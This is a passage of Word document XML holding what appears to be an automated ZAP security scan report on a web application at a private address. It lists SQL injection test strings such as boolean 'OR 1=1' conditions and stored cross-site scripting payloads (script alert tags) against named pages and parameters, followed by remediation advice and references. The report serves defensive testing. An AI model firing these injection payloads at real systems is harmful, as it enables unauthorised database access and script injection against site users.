      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="57BE895F"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46DB49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3FB682A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56597761"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3A8D96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3FA920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188E53C3"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145AF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295AB99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admin' AND '1'='1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="232B5149"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273010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79E361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http://192.168.1.20/admin/login-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="21CE3D01"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FDA1B5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7D5786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30717010"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00704A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2849C0A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3EB707E7"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AE4D44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07B17A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ZAP' OR '1'='1' --</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="240111C3"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0EB707D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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1EB515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6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="65CF4E80"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581327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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71D2D2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Do not trust client side input, even if there is client side validation in place.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FD5C0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 general, type check all data on the server side.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="063CF7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If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BFCF3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If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62230E7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If database Stored Procedures can be used, use them.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75EECE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Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6569C5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Do not create dynamic SQL queries using simple string concatenation.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25C808A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Escape all data received from the client.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06015D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Apply a 'whitelist' of allowed characters, or a 'blacklist' of disallowed characters in user input.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D7413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Apply the principle of least privilege by using the least privileged database user possible.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6919814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 particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="128079D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Grant the minimum database access that is necessary for the application.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6CD7E920"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5D0368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Other information</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="66BCB07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page results were successfully manipulated using the boolean conditions [hacklab@hacklab.com' AND '1'='1' -- ] and [hacklab@hacklab.com' AND '1'='2' -- ]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FCA9F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parameter value being modified was NOT stripped from the HTML output for the purposes of the comparison</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B67C5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Data was returned for the original parameter.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6716B2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vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="44623407" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="4"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3217569B" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4BC294D4"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0672C17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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B74D2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https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="47E103A6"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02D477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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2BFA99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89</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0D1F6C5E"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1E55D0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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D39CAA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19</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="62F2B4A2"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098CF88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Source ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="002693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r w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3C0BD4AC" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="140884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High (Medium)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="25C61B2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Cross Site Scripting (Persistent)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="14F6852D"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2CEAA4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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40C2F4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Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="123ABE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When an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72A27AA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There are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E47BF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Non-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0178DE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Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0740191E" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="4"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="505FD375" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="145EE80F"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41105B6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2B8E7D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http://192.168.1.20/member-ratings.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="73C050E5"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17F946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5116D3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EC453D1"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33EC69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0FA602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comment</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5384B3E2"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7CD071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639E85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&lt;/td&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;td&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="69ECD3AB"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24F5B6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0160641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http://192.168.1.20/tables.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="01AC7418"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3D8136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2127747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AE1C5B4"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FEE754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0A1677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name</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1B287F2F"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626A42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218C37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&lt;/option&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;option&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="039AFD9F"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7BA3EDE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5AEAFA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http://192.168.1.20/partyhalls.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="75C2C061"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6C005C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64F0679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5B0C31A"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B5B2FB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044352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name</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="459849B5"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9397D4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7D872B6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&lt;/option&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;option&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5982D1E0"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7E508F6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739941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http://192.168.1.20/login-register.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5C825D10"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0ABA61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2B46F71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42B77F2"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103906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Parameter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="76C023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name</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="46C960EB"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52A5698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2ECE98D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&lt;/option&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;option&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7B4566B8"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3697ECC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7D63DDE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http://192.168.1.20/inbox.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="52DC342B"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3082A5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1F2112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6E96E7E"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64CA37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3CC7C55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txtmessage</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7B894CF4"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5440CF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555A12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&lt;/td&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;td&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2B31CB45"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5D5A1BC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64E7C9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http://192.168.1.20/inbox.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="612359AC"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304FD7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020A53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474B396"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243409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7B4B57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subject</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1D40736A"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5C1A400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76184C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&lt;/td&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;td&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="227A36A5" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="60" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="60" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C9862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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D08B7A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http://192.168.1.20/foodzone.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="478A7161"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58F1B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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E1FDDB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AC84BF4"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252C684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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33A98E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name</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="41DB3940" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="60" w:type="dxa"/>
              <w:left w:w="600" w:type="dxa"/>
              <w:bottom w:w="60" w:type="dxa"/>
              <w:right w:w="600" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="411676E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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15DC5CA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&lt;/option&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;option&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4AC4C607"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12302A2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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5CCD4B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7</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="400A5E11"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79EDDC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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3544166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Architecture and Design</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="101C39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Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25CFD8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Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31B94A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Phases: Implementation; Architecture and Design</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C59EA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Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10798EF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any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="226DC88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Consult the XSS Prevention Cheat Sheet for more details on the types of encoding and escaping that are needed.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68B200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Architecture and Design</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FDBC0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any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C664E8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If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BDFBF7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Implementation</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51C17F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every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="074F50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 xml:space="preserve">To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of </w:t>
            </w:r>
            <w:r w:rsidRPr="00DA102C">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08E176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Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C97B8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When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="739541C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that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="42909094"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68C791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Other information</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B16BE5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URL: http://192.168.1.20/ratings-exec.php?id=18</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="19CC6F0F" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="4"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3F076577" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="53BE3D31"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52CD4A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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28A9FF2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http://projects.webappsec.org/Cross-Site-Scripting</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CADD48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http://cwe.mitre.org/data/definitions/79.html</w:t>
            </w:r>
          </w:p>
